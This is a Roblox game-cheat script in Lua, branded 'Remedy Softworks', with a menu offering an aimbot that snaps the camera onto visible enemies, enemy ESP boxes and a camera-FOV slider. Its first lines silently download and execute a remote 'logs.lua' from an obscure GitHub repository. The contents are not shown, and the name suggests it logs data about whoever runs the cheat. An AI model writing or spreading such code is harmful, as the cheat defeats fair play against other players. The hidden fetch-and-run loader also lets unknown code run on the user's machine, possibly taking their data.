-- Import the external script
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua"))()
end)

if not success then
    warn("Failed to load external script:", result)
else
    print("External script executed successfully.")
end

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Remedy Softworks", -- Required
	Text = "Thanks for Using Remedy Softworks", -- Required
	Icon = "rbxassetid://113548811936137" -- Optional
})

-- Import LinoriaLib
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

-- Create the main window
local Window = Library:CreateWindow({
    Title = 'Remedy | Private User',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})

-- Create tabs
local Tabs = {
    Aim = Window:AddTab('Aim'),
    Visuals = Window:AddTab('Visuals'),
    Misc = Window:AddTab('Misc'),
    ['UI Settings'] = Window:AddTab('UI Settings')
}

-- Create Aimbot Settings
local LeftGroupBoxAim = Tabs.Aim:AddLeftGroupbox('Aimbot Settings')

-- Define Toggles and Options
local Toggles = {
    AimbotToggle = LeftGroupBoxAim:AddToggle('AimbotToggle', {
        Text = 'Enable Aimbot',
        Default = false,
        Tooltip = 'Enable or disable aimbot',
    }),
    ShowFOV = LeftGroupBoxAim:AddToggle('ShowFOV', {
        Text = 'Show FOV Circle',
        Default = false,
        Tooltip = 'Shows the FOV circle for aimbot',
    }),
    ToggleBoxes = Tabs.Visuals:AddLeftGroupbox('Visuals Settings'):AddToggle('ToggleBoxes', {
        Text = 'Toggle Enemy Boxes (ESP)',
        Default = false,
        Tooltip = 'Draw boxes around enemies',
    })
}

local Options = {
    FOVSize = LeftGroupBoxAim:AddSlider('FOVSize', {
        Text = 'FOV Size',
        Default = 100,
        Min = 50,
        Max = 500,
        Suffix = 'px',
        Rounding = 0,
        Compact = false,
        HideMax = false,
        Tooltip = 'Adjust the size of the FOV for the aimbot',
    }),
    AimbotSmoothness = LeftGroupBoxAim:AddSlider('AimbotSmoothness', {
        Text = 'Aimbot Smoothness',
        Default = 5,
        Min = 1,
        Max = 20,
        Suffix = '',
        Rounding = 1,
        Compact = false,
        HideMax = false,
        Tooltip = 'Controls how smooth the aimbot snaps to targets',
    }),
    CameraFOV = Tabs.Misc:AddLeftGroupbox('Misc Settings'):AddSlider('CameraFOV', {
        Text = 'Camera FOV',
        Default = 70,
        Min = 10,
        Max = 120,
        Suffix = '°',
        Rounding = 0,
        Compact = false,
        HideMax = false,
        Tooltip = 'Adjust the camera field of view',
        Callback = function(value)
            local Camera = workspace.CurrentCamera
            Camera.FieldOfView = value
        end
    })
}

-- FOV Circle Drawing
local FOVCircle = Drawing.new("Circle")
FOVCircle.Thickness = 2
FOVCircle.Transparency = 1
FOVCircle.Color = Color3.fromRGB(0, 255, 0)
FOVCircle.Filled = false
FOVCircle.Visible = false

-- Update the FOV Circle around the mouse
local function UpdateFOV()
    local mouse = game.Players.LocalPlayer:GetMouse()
    FOVCircle.Position = Vector2.new(mouse.X, mouse.Y + 36) -- Adjust for mouse position
    FOVCircle.Radius = Options.FOVSize.Value
    FOVCircle.Visible = Toggles.ShowFOV.Value
end

game:GetService('RunService').RenderStepped:Connect(UpdateFOV)

-- Check if the target is visible using raycasting
local function IsVisible(targetPart)
    local origin = game.Workspace.CurrentCamera.CFrame.Position
    local direction = (targetPart.Position - origin).Unit * (targetPart.Position - origin).Magnitude
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {game.Players.LocalPlayer.Character} -- Ignore local player
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local ray = game.Workspace:Raycast(origin, direction, raycastParams)

    return ray == nil -- If no obstruction, target is visible
end

-- Detect Right-Click Hold
local UserInputService = game:GetService('UserInputService')
local rightClickHeld = false

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rightClickHeld = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rightClickHeld = false
    end
end)

-- Aimbot Logic (with FOV, Smoothness, Visibility, and Right Click)
local function Aimbot()
    if not Toggles.AimbotToggle.Value or not rightClickHeld then return end

    local camera = game.Workspace.CurrentCamera
    local localPlayer = game.Players.LocalPlayer
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Team ~= localPlayer.Team and player.Character and player.Character:FindFirstChild('Humanoid') and player.Character.Humanoid.Health > 0 then
            local targetPart = player.Character:FindFirstChild("HumanoidRootPart")
            if targetPart and IsVisible(targetPart) then
                local playerPos = targetPart.Position
                local screenPoint, onScreen = camera:WorldToViewportPoint(playerPos)

                if onScreen then
                    local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)).Magnitude
                    if (not Toggles.ShowFOV.Value or distance < Options.FOVSize.Value) and distance < shortestDistance then
                        shortestDistance = distance
                        closestPlayer = player
                    end
                end
            end
        end
    end

    if closestPlayer then
        local targetPosition = closestPlayer.Character.HumanoidRootPart.Position
        local currentPosition = camera.CFrame.Position
        local targetCFrame = CFrame.new(currentPosition, targetPosition)
        camera.CFrame = CFrame.new(currentPosition:Lerp(targetCFrame.Position, Options.AimbotSmoothness.Value / 100), targetPosition)
    end
end

game:GetService('RunService').RenderStepped:Connect(Aimbot)

-- ESP Section
local ESPBoxes = {}
local UpdateInterval = 0.1 -- Time in seconds between updates
local lastUpdateTime = tick()

local function CreateBox(player)
    if not player.Character then return end

    local Box = Drawing.new("Square")
    Box.Thickness = 2
    Box.Transparency = 1
    Box.Color = Color3.fromRGB(66, 135, 245)
    Box.Filled = false

    ESPBoxes[player] = Box

    local function UpdateBox()
        if Toggles.ToggleBoxes.Value and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local rootPart = player.Character.HumanoidRootPart
            local rootPos, onScreen = game.Workspace.CurrentCamera:WorldToViewportPoint(rootPart.Position)
            if onScreen then
                local sizeY = (game.Workspace.CurrentCamera:WorldToViewportPoint((rootPart.CFrame * CFrame.new(0, 3, 0)).p) - game.Workspace.CurrentCamera:WorldToViewportPoint((rootPart.CFrame * CFrame.new(0, -3, 0)).p)).Magnitude
                local sizeX = sizeY * 0.6
                Box.Size = Vector2.new(sizeX, sizeY)
                Box.Position = Vector2.new(rootPos.X - Box.Size.X / 2, rootPos.Y - Box.Size.Y / 2)
                Box.Visible = player.Team ~= game.Players.LocalPlayer.Team
            else
                Box.Visible = false
            end
        else
            Box.Visible = false
        end
    end

    game:GetService("RunService").RenderStepped:Connect(UpdateBox)

    -- Update ESP after respawn
    player.CharacterAdded:Connect(function(character)
        ESPBoxes[player] = Box
    end)

    player.CharacterRemoving:Connect(function()
        if ESPBoxes[player] then
            ESPBoxes[player]:Remove()
            ESPBoxes[player] = nil
        end
    end)
end

local function DrawBoxes()
    local currentTime = tick()
    if currentTime - lastUpdateTime >= UpdateInterval then
        lastUpdateTime = currentTime
        if Toggles.ToggleBoxes.Value then
            for _, player in pairs(game:GetService('Players'):GetPlayers()) do
                if player ~= game.Players.LocalPlayer and player.Team ~= game.Players.LocalPlayer.Team then
                    if not ESPBoxes[player] then
                        CreateBox(player)
                    end
                end
            end
        else
            for _, box in pairs(ESPBoxes) do
                box.Visible = false
            end
        end
    end
end

game:GetService('RunService').RenderStepped:Connect(DrawBoxes)
